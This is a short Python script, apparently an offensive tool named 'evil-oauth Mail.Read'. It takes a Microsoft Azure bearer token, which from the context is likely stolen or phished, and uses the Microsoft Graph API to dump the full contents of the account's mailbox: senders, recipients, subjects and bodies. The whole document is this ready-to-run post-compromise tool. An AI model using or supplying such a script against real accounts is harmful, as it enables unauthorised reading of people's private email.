import requests
import argparse

parser = argparse.ArgumentParser('evil-oauth Mail.Read')
parser.add_argument('bearer_token', help='Microsoft Azure Bearer Access Token with Mail.Read Scope')
args = parser.parse_args()

bearer_token = args.bearer_token

graph_url = 'https://graph.microsoft.com/v1.0/me/messages'
graph_headers = {
    'Authorization': f'Bearer {bearer_token}'
}
graph_response = requests.get(graph_url, headers=graph_headers)

emails = graph_response.json().get('value')
for email in emails:
	print('Sender: ', email['sender'])
	print('From: ', email['from'])
	print('To Recepients: ', email['toRecipients'])
	print('Subject: ', email['subject'])
	print('Body: ', email['body'])
	print('')
